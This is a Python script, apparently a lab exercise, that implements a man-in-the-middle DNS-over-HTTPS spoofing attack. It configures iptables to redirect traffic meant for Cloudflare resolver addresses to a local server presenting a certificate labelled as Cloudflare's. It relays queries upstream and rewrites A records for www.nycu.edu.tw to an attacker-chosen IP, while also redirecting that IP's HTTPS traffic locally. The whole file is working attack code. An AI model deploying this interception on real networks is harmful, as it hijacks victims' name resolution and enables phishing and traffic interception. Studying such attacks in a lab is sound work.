#!/usr/bin/env python3
import asyncio
import base64
import os
import subprocess
import signal
import sys
from urllib.parse import parse_qs
from typing import Optional

import dns.message
import dns.rdatatype
import dns.rrset
import httpx
from hypercorn.asyncio import serve
from hypercorn.config import Config

LISTEN_PORT = 4443
SPOOF_DOMAIN = "www.nycu.edu.tw"
SPOOF_IPV4 = "192.168.126.123"
SPOOF_TTL = 60
UPSTREAM_DOH_URL = os.getenv("UPSTREAM_DOH_URL", "https://mozilla.cloudflare-dns.com/dns-query")
CERT_FILE = "certificates/cloudflare.crt"
KEY_FILE = "certificates/cloudflare.key"
CLOUDFLARE_IPS = ["162.159.61.4", "172.64.41.4", "1.1.1.1"]
UPSTREAM_TIMEOUT = 5.0

_upstream: Optional[httpx.AsyncClient] = None

def setup_network():
    cmds = [
        f"sudo sysctl -w net.ipv4.ip_forward=1",
        "sudo iptables -t nat -F",
        "sudo iptables -A OUTPUT -p icmp --icmp-type redirect -j DROP",
        f"sudo iptables -t nat -A PREROUTING -p tcp -d {SPOOF_IPV4} --dport 443 -j REDIRECT --to-port 5443"
    ]
    for ip in CLOUDFLARE_IPS:
        cmds.append(f"sudo iptables -t nat -A PREROUTING -p tcp -d {ip} --dport 443 -j REDIRECT --to-port {LISTEN_PORT}")
    for cmd in cmds:
        subprocess.run(cmd, shell=True, check=True)
    print('[*] Iptables and forwarding configured.')

def cleanup_network():
    subprocess.run("sudo iptables -F", shell=True)
    subprocess.run("sudo iptables -t nat -F", shell=True)
    subprocess.run("sudo sysctl -w net.ipv4.ip_forward=0", shell=True)
    print("[*] Network cleaned up.")

def _normalize_qname(name: str) -> str:
    return name.rstrip(".").lower()

def _b64url_decode_nopad(data: str) -> bytes:
    pad = "=" * ((4 - (len(data) % 4)) % 4)
    return base64.urlsafe_b64decode(data + pad)

async def _read_body(receive) -> bytes:
    body = bytearray()
    more = True
    while more:
        msg = await receive()
        body.extend(msg.get("body", b""))
        more = msg.get("more_body", False)
    return bytes(body)

def _rewrite_response(query_wire: bytes, upstream_wire: bytes) -> Optional[bytes]:
    query = dns.message.from_wire(query_wire)
    if not query.question:
        return None
    q = query.question[0]
    qname = _normalize_qname(str(q.name))
    qtype = dns.rdatatype.to_text(q.rdtype)
    if qname != SPOOF_DOMAIN:
        return None
    upstream = dns.message.from_wire(upstream_wire)
    upstream.answer = []
    upstream.authority = []
    # 保留 OPT RR
    upstream.additional = [rr for rr in upstream.additional if rr.rdtype == dns.rdatatype.OPT]
    if qtype == "A":
        rrset = dns.rrset.from_text(q.name, SPOOF_TTL, "IN", "A", SPOOF_IPV4)
        upstream.answer.append(rrset)
        return upstream.to_wire()
    if qtype == "AAAA":
        # 若有 SPOOF_IPV6 可加這段
        # rrset = dns.rrset.from_text(q.name, SPOOF_TTL, "IN", "AAAA", SPOOF_IPV6)
        # upstream.answer.append(rrset)
        return upstream.to_wire()
    # 其他型別回傳空答案
    return upstream.to_wire()

async def app(scope, receive, send):
    global _upstream
    if scope["type"] == "lifespan":
        while True:
            msg = await receive()
            if msg["type"] == "lifespan.startup":
                _upstream = httpx.AsyncClient(http2=True, timeout=UPSTREAM_TIMEOUT, trust_env=False)
                await send({"type": "lifespan.startup.complete"})
            elif msg["type"] == "lifespan.shutdown":
                await _upstream.aclose()
                await send({"type": "lifespan.shutdown.complete"})
                return
        return

    if scope["type"] != "http":
        return

    method = scope.get("method", "GET").upper()
    path = scope.get("path", "")
    if path != "/dns-query":
        await send({
            "type": "http.response.start",
            "status": 404,
            "headers": [[b"content-type", b"text/plain"], [b"content-length", b"9"]],
        })
        await send({"type": "http.response.body", "body": b"not found"})
        return
    if method not in {"GET", "POST"}:
        await send({
            "type": "http.response.start",
            "status": 405,
            "headers": [[b"content-type", b"text/plain"], [b"content-length", b"18"]],
        })
        await send({"type": "http.response.body", "body": b"method not allowed"})
        return

    query_string = scope.get("query_string", b"")
    drained_body = await _read_body(receive)
    if method == "GET":
        qs = parse_qs(query_string.decode(), keep_blank_values=True)
        dns_param = qs.get("dns", [""])[0]
        dns_query = _b64url_decode_nopad(dns_param)
    else:
        dns_query = drained_body

    # 解析查詢資訊
    qname, qtype = "?", "?"
    try:
        qmsg = dns.message.from_wire(dns_query)
        if qmsg.question:
            q = qmsg.question[0]
            qname = _normalize_qname(str(q.name))
            qtype = dns.rdatatype.to_text(q.rdtype)
    except Exception:
        pass

    # 先送到 upstream
    try:
        resp = await _upstream.post(UPSTREAM_DOH_URL, content=dns_query, headers={"content-type": "application/dns-message"})
    except Exception as e:
        print(f"[!] Upstream error: {e}")
        await send({
            "type": "http.response.start",
            "status": 504,
            "headers": [[b"content-type", b"text/plain"], [b"content-length", b"7"]],
        })
        await send({"type": "http.response.body", "body": b"timeout"})
        return

    resp_body = resp.content
    rewritten = _rewrite_response(dns_query, resp.content)
    if rewritten:
        print(f"[DoH:spoof] {qtype} {qname}")
        resp_body = rewritten
    else:
        print(f"[DoH:fwd] {qtype} {qname}")

    await send({"type": "http.response.start", "status": 200, "headers": [
        [b"content-type", b"application/dns-message"],
        [b"content-length", str(len(resp_body)).encode()],
        [b"cache-control", b"no-store"],
    ]})
    await send({"type": "http.response.body", "body": resp_body})

if __name__ == "__main__":
    setup_network()
    config = Config()
    config.bind = [f"0.0.0.0:{LISTEN_PORT}"]
    config.certfile = CERT_FILE
    config.keyfile = KEY_FILE
    config.alpn_protocols = ["h2", "http/1.1"]

    def shutdown_handler(signum, frame):
        cleanup_network()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown_handler)
    try:
        asyncio.run(serve(app, config))
    finally:
        cleanup_network()